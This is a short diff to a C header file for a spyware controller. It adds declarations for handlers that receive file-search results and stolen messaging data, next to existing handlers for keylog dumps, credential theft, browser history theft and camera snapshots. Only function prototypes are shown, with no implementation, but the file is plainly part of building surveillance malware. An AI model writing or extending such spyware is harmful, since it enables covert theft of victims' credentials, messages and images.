@@ -12,5 +12,7 @@ void handle_keylog_dump_response(Packet *resp, const char *save_dir);
 void handle_cred_steal_response(Packet *resp, const char *save_dir);
 void handle_history_steal_response(Packet *resp, const char *save_dir);
 void handle_camera_snapshot_response(Packet *resp, const char *save_dir);
+void handle_file_search_response(Packet *resp, const char *save_dir);
+void handle_messaging_steal_response(Packet *resp, const char *save_dir);
 
 #endif /* SPYWARE_CONTROLLER_H */
